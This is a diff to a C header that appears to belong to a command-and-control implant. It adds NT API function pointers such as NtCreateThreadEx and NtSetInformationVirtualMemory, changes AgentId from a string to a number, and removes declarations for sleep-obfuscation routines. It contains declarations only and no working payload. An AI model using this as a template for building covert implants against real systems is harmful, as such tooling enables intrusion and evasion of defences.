@@ -78,6 +78,7 @@ typedef struct _INSTANCE {
         void     (NTAPI *RtlExitUserProcess)(NTSTATUS ExitStatus);
         void     (NTAPI *RtlExitUserThread)(NTSTATUS ExitStatus);
         PVOID    (NTAPI *RtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
+        PVOID    (NTAPI *RtlCreateHeap)(ULONG Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PRTL_HEAP_PARAMETERS Parameters);
         BOOLEAN  (NTAPI *RtlFreeHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
         PVOID    (NTAPI *RtlReAllocateHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress, SIZE_T Size);
         NTSTATUS (NTAPI *RtlCreateTimer)(HANDLE TimerQueueHandle, PHANDLE Handle, WAITORTIMERCALLBACKFUNC Function, PVOID Context, ULONG DueTime, ULONG Period, ULONG Flags);
@@ -89,6 +90,9 @@ typedef struct _INSTANCE {
         NTSTATUS (NTAPI *NtCreateThreadEx)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
         NTSTATUS (NTAPI *LdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
         NTSTATUS (NTAPI *NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+        NTSTATUS (NTAPI *NtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
+        NTSTATUS (NTAPI *NtSetInformationVirtualMemory)(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, ULONG_PTR NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength);
+
         NTSTATUS (NTAPI *NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
         NTSTATUS (NTAPI *NtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
         NTSTATUS (NTAPI *NtTestAlert)(void);
@@ -149,7 +153,7 @@ typedef struct _INSTANCE {
         } TransportWeb;
         
         struct {
-            PSTR   AgentId;
+            DWORD  AgentId;
             DWORD  ProcessArch;
             BOOL   Elevated;
             BOOL   Connected;
@@ -189,17 +193,5 @@ typedef struct _INSTANCE {
 
 EXTERN_C PVOID StRipStart();
 EXTERN_C PVOID StRipEnd();
-
-VOID BlackoutMain(
-    _In_ PVOID Param
-);
-
-VOID FoliageObf( 
-    _In_ DWORD SleepTime
-);
-
-EXTERN_C VOID volatile ___chkstk_ms(
-        VOID
-);
 
 #endif //INSTANCE_COMMON_H
